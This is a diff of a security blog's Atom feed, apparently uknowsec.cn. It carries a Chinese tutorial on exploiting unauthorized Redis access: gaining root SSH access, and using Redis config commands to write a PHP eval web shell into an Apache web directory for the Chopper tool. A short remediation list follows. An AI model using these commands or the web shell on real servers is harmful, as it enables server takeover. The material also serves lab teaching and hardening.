@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-07-13T02:09:35.465Z</updated>
+  <updated>2017-07-13T02:10:50.111Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"/>
     <id>http://uknowsec.cn/posts/skill/配置漏洞之redis未授权访问.html</id>
     <published>2017-07-12T09:35:01.000Z</published>
-    <updated>2017-07-13T02:09:35.465Z</updated>
+    <updated>2017-07-13T02:10:50.111Z</updated>
     
     <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
 <h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</div><div class="line">$ tar xzf redis-2.8.3.tar.gz</div><div class="line">$ cd redis-2.8.3</div><div class="line">$ make</div></pre></td></tr></table></figure></p>
@@ -44,7 +44,7 @@
 <h4 id="检查是否更改"><a href="#检查是否更改" class="headerlink" title="检查是否更改"></a>检查是否更改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</div></pre></td></tr></table></figure>
 <h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; save</div></pre></td></tr></table></figure>
 <h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh –i  id_rsa root@192.168.1.11</div></pre></td></tr></table></figure>
-<h3 id="写入Shell"><a href="#写入Shell" class="headerlink" title="写入Shell"></a>写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.111</div></pre></td></tr></table></figure>
+<h3 id="利用redis写入Shell"><a href="#利用redis写入Shell" class="headerlink" title="利用redis写入Shell"></a>利用redis写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.111</div></pre></td></tr></table></figure>
 <h4 id="确定web服务目录"><a href="#确定web服务目录" class="headerlink" title="确定web服务目录"></a>确定web服务目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /usr/local/apache/htdocs/</div><div class="line">config set dbfilename ok.php </div><div class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
 <h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
 <li>禁止使用 root 权限启动 redis 服务；</li>
